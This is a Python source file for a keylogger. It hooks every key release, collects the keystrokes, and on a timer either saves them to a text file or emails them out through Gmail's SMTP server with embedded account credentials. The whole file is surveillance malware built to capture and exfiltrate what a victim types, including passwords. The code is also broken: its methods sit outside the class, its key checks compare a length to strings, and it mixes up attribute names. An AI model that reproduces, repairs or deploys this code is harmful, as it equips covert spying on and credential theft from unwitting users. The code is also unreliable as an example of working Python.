import keyboard
import smtplib
from threading import Timer
from datetime import date, datetime

SENDING_INTERVAL = 3000
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


def callback(self, event):
    name = event.name

    if len(name) == "space":
        name = " "
    elif len(name) == "enter":
        name = "[ENTER]\n"
    else:
        name = name.replace(" ", "_")
        name = f"[{name.upper()}]"

    self.log += name


def update_filename(self):
    start_date_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
    end_date_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
    self.filename = f"log-{start_date_str}_{end_date_str}"


def report_to_file(self):
    with open(f"{self.filename}.txt", "w") as f:
        print(self.log, file=f)
    print(f"[+] Saved {self.filename}.txt")


def sendmail(self, email, password, message):
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def report(self):
    if self.log:
        self.end_date = datetime.now()
        self.update_filename()

    if self.report_method == "email":
        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)

    elif self.report_method == "file":
        self.report_to_file()

    self.start_date = datetime.now()
    self.log = ""
    timer = Timer(interval=self.interval, function=self.report)
    timer.daemon = True
    timer.start()


def start(self):
    self.start_date = datetime.now()
    keyboard.on_release(callback=self.callback)
    self.report()
    keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SENDING_INTERVAL, report_method="file")
    keylogger.start()
